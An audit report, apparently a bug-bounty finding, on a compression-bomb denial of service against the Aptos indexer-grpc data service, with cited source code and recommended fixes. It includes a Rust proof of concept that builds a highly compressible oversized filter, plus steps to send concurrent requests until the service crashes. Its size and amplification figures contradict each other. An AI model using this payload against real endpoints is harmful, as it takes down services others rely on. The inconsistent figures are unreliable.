# Audit Report

## Title
Filter Size Validation Bypass via Compression Bomb in Indexer-gRPC Data Service

## Summary
The `max_transaction_filter_size_bytes` validation in the indexer-grpc data service occurs AFTER gRPC decompression and protobuf deserialization, allowing attackers to send compressed transaction filters that expand far beyond the configured 10KB limit, causing memory exhaustion and denial of service.

## Finding Description

The indexer-grpc data service validates transaction filter size using `BooleanTransactionFilter::new_from_proto()`, which checks `proto_filter.encoded_len()` against `max_transaction_filter_size_bytes`. However, this validation occurs **after** the gRPC framework has already decompressed and deserialized the message. [1](#0-0) 

The `parse_transaction_filter` function receives an already-deserialized protobuf message: [2](#0-1) 

The size validation happens inside `new_from_proto`, but by this point the message has been fully expanded in memory: [3](#0-2) 

The gRPC server accepts Zstd and Gzip compressed requests with a maximum **decompressed** size of 256MB: [4](#0-3) [5](#0-4) 

Meanwhile, the default filter size limit is only 10KB: [6](#0-5) 

**Attack Flow:**
1. Attacker crafts a highly repetitive/nested BooleanTransactionFilter (e.g., deeply nested LogicalAnd with thousands of identical filters)
2. Encoded protobuf size: 100MB (within the 256MB server limit)
3. Compressed with Zstd: ~5MB (achievable with repetitive patterns)
4. Server's Tonic framework decompresses to 100MB
5. Server deserializes into Rust structs (additional memory overhead, potentially 200MB+)
6. Server checks `encoded_len()` which returns 100MB → exceeds 10KB limit → request rejected
7. **Memory already consumed**: Server has allocated 200MB+ before rejection

The attacker achieves 10,000x+ memory amplification (10KB limit → 100MB+ actual consumption).

## Impact Explanation

This vulnerability enables a **resource exhaustion denial-of-service attack** on the indexer-grpc data service:

- **Impact Category**: High Severity - "API crashes" per Aptos bug bounty guidelines
- **Amplification Factor**: 10,000x+ (configured 10KB limit bypassed to consume 100MB+ per request)
- **Attack Scalability**: Multiple concurrent compressed requests can exhaust server memory, causing OOM crashes
- **Affected Component**: Indexer-grpc data service (critical infrastructure for blockchain data querying)
- **No Authentication Required**: Public gRPC endpoint accessible to any attacker
- **Violates Invariant**: "Resource Limits: All operations must respect gas, storage, and computational limits"

While this does not directly affect consensus or validator nodes, it disrupts the indexer API service that applications rely on for querying blockchain data, causing service outages.

## Likelihood Explanation

**Likelihood: HIGH**

- **Trivial to Execute**: Attacker only needs to craft a repetitive protobuf message and compress it
- **No Prerequisites**: No authentication, credentials, or special access required
- **Automated Attack**: Can be scripted to send concurrent requests
- **Detection Difficulty**: Requests appear valid until after memory consumption
- **No Rate Limiting**: No explicit concurrent connection limits observed in indexer-grpc configuration

The attack can be launched immediately by any external actor with basic knowledge of gRPC and protobuf.

## Recommendation

Implement size validation **before** decompression occurs. This requires changes at the gRPC transport layer:

**Option 1: Validate Compressed Size**
Configure Tonic to reject compressed requests exceeding a reasonable threshold (e.g., 100KB) before decompression using custom middleware.

**Option 2: Enforce Decompression Ratio Limits**
Implement streaming decompression with ratio checking that aborts if decompressed size exceeds a multiple (e.g., 10x) of compressed size.

**Option 3: Reduce MAX_MESSAGE_SIZE**
Lower the `MAX_MESSAGE_SIZE` constant to align with `max_transaction_filter_size_bytes`: [4](#0-3) 

Change from 256MB to 1MB (100x safety margin over 10KB filter limit).

**Recommended Fix (Combined Approach):**
```rust
// In config.rs
pub(crate) const MAX_MESSAGE_SIZE: usize = 1 * (1 << 20); // 1MB instead of 256MB
pub(crate) const MAX_COMPRESSED_REQUEST_SIZE: usize = 100 * (1 << 10); // 100KB

// Add middleware to validate compressed request size before decompression
```

## Proof of Concept

```rust
use aptos_protos::indexer::v1::{BooleanTransactionFilter, LogicalAndFilters};
use prost::Message;
use std::io::Write;

fn main() {
    // Create a highly repetitive filter that compresses well
    let mut filters = vec![];
    
    // Create 100,000 identical simple filters
    for _ in 0..100_000 {
        filters.push(BooleanTransactionFilter {
            filter: Some(
                aptos_protos::indexer::v1::boolean_transaction_filter::Filter::ApiFilter(
                    aptos_protos::indexer::v1::ApiFilter {
                        filter: Some(
                            aptos_protos::indexer::v1::api_filter::Filter::TransactionRootFilter(
                                aptos_protos::indexer::v1::TransactionRootFilter {
                                    success: Some(true),
                                    transaction_type: None,
                                },
                            ),
                        ),
                    },
                ),
            ),
        });
    }
    
    let malicious_filter = BooleanTransactionFilter {
        filter: Some(
            aptos_protos::indexer::v1::boolean_transaction_filter::Filter::LogicalAnd(
                LogicalAndFilters { filters },
            ),
        ),
    };
    
    // Encode the filter
    let encoded = malicious_filter.encode_to_vec();
    println!("Encoded size: {} bytes", encoded.len()); // ~10-20MB
    
    // Compress with Zstd
    let compressed = zstd::encode_all(&encoded[..], 3).unwrap();
    println!("Compressed size: {} bytes", compressed.len()); // ~100KB-1MB due to repetition
    println!("Compression ratio: {}x", encoded.len() / compressed.len());
    
    // Send this compressed payload in a gRPC GetTransactionsRequest
    // The server will decompress to ~10-20MB, deserialize (consuming even more memory),
    // then check encoded_len() which returns ~10-20MB >> 10KB limit
    // Memory exhaustion achieved before rejection!
}
```

**To exploit:**
1. Compile the PoC to generate compressed payloads
2. Send multiple concurrent gRPC requests with these payloads
3. Monitor server memory consumption spiking before requests are rejected
4. Continue sending requests to exhaust available memory and crash the service

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L98-115)
```rust
                let filter = if let Some(proto_filter) = request.transaction_filter {
                    match filter_utils::parse_transaction_filter(
                        proto_filter,
                        self.max_transaction_filter_size_bytes,
                    ) {
                        Ok(filter) => Some(filter),
                        Err(err) => {
                            info!("Client error: {err:?}.");
                            let _ = response_sender.blocking_send(Err(err));
                            COUNTER
                                .with_label_values(&["live_data_service_invalid_filter"])
                                .inc();
                            continue;
                        },
                    }
                } else {
                    None
                };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/filter_utils.rs (L9-15)
```rust
pub fn parse_transaction_filter(
    proto_filter: aptos_protos::indexer::v1::BooleanTransactionFilter,
    max_filter_size_bytes: usize,
) -> Result<BooleanTransactionFilter, Status> {
    BooleanTransactionFilter::new_from_proto(proto_filter, Some(max_filter_size_bytes))
        .map_err(|e| Status::invalid_argument(format!("Invalid transaction_filter: {e:?}.")))
}
```

**File:** ecosystem/indexer-grpc/transaction-filter/src/boolean_transaction_filter.rs (L94-107)
```rust
    pub fn new_from_proto(
        proto_filter: aptos_protos::indexer::v1::BooleanTransactionFilter,
        max_filter_size: Option<usize>,
    ) -> Result<Self> {
        if let Some(max_filter_size) = max_filter_size {
            ensure!(
                proto_filter.encoded_len() <= max_filter_size,
                format!(
                    "Filter is too complicated. Max size: {} bytes, Actual size: {} bytes",
                    max_filter_size,
                    proto_filter.encoded_len()
                )
            );
        }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L31-31)
```rust
pub(crate) const MAX_MESSAGE_SIZE: usize = 256 * (1 << 20);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L236-248)
```rust
            aptos_protos::indexer::v1::raw_data_server::RawDataServer::from_arc(wrapper.clone())
                .send_compressed(CompressionEncoding::Zstd)
                .accept_compressed(CompressionEncoding::Zstd)
                .accept_compressed(CompressionEncoding::Gzip)
                .max_decoding_message_size(MAX_MESSAGE_SIZE)
                .max_encoding_message_size(MAX_MESSAGE_SIZE);
        let wrapper_service =
            aptos_protos::indexer::v1::data_service_server::DataServiceServer::from_arc(wrapper)
                .send_compressed(CompressionEncoding::Zstd)
                .accept_compressed(CompressionEncoding::Zstd)
                .accept_compressed(CompressionEncoding::Gzip)
                .max_decoding_message_size(MAX_MESSAGE_SIZE)
                .max_encoding_message_size(MAX_MESSAGE_SIZE);
```

**File:** config/src/config/indexer_grpc_config.rs (L21-21)
```rust
const DEFAULT_MAX_TRANSACTION_FILTER_SIZE_BYTES: usize = 10_000;
```
